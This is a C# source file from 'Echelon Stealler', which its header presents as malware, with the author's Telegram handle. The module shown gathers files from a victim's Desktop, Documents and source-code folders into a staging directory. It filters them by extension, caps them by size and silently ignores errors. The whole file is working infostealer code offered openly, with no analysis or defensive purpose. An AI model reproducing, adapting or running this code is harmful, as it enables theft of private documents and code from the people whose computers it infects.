///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using System;
using System.Collections.Generic;
using System.IO;

namespace Echelon
{
    public partial class GetFiles
    {
        public static int count = 0;
        public static void Inizialize(string Echelon_Dir)
        {
            try
            {
                string Files = Echelon_Dir + "\\Files";
                Directory.CreateDirectory(Files);
                if (!Directory.Exists(Files))
                {
                    Inizialize(Files);
                }
                else
                {
                    // 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
                    CopyDirectory(Help.DesktopPath, Files, "*.*", Program.FileSize);
                    CopyDirectory(Help.MyDocuments, Files, "*.*", Program.FileSize);
                    CopyDirectory(Help.UserProfile + "\\source", Files, "*.*", Program.FileSize);

                    // CopyDirectory("[From]"], "[To]", "*.*", "[Limit]");   
                }
            }
            catch { }
        }
        private static long GetDirSize(string path, long size = 0)
        {
            try
            {
                foreach (string file in Directory.EnumerateFiles(path))
                {
                    try
                    {
                        size += new FileInfo(file).Length;
                        
                    }
                    catch  { }
                }
                foreach (string dir in Directory.EnumerateDirectories(path))
                {
                    try
                    {
                        size += GetDirSize(dir);
                    }
                    catch  { }
                }
            }
            catch  { }
            return size;
        }

        public static void CopyDirectory(string source, string target, string pattern, long maxSize)
        {
            var stack = new Stack<Folders>();
            stack.Push(new Folders(source, target));
            long size = GetDirSize(target);
            while (stack.Count > 0)

            {
                Folders folders = stack.Pop();
                try
                {
                    Directory.CreateDirectory(folders.Target);
                    foreach (string file in Directory.EnumerateFiles(folders.Source, pattern))
                    {
                        try
                        {
                            if (Array.IndexOf(Program.Echelon_Size, Path.GetExtension(file).ToLower()) < 0)
                            {
                                continue;
                            }
                            string targetPath = Path.Combine(folders.Target, Path.GetFileName(file));
                            if (new FileInfo(file).Length / 0x400 < 0x1388) // 1024 < 5000
                            {
                                File.Copy(file, targetPath);
                                size += new FileInfo(targetPath).Length;
                                if (size > maxSize)
                                {
                                    return;
                                }
                                count++;
                            }
                        }
                        catch  { }
                    }
                }
                catch  (UnauthorizedAccessException) { continue; }
                catch  (PathTooLongException) { continue; }
                try
                {
                    foreach (string folder in Directory.EnumerateDirectories(folders.Source))
                    {
                        try
                        {
                            if (!folder.Contains(Path.Combine(Help.DesktopPath, Environment.UserName)))
                            {
                                stack.Push(new Folders(folder, Path.Combine(folders.Target, Path.GetFileName(folder))));
                            }
                        }
                        catch  { }
                    }
                }
                catch  (UnauthorizedAccessException) { continue; }
                catch  (DirectoryNotFoundException) { continue; }
                catch  (PathTooLongException) { continue; }
            }
            stack.Clear();
        }
    }
}
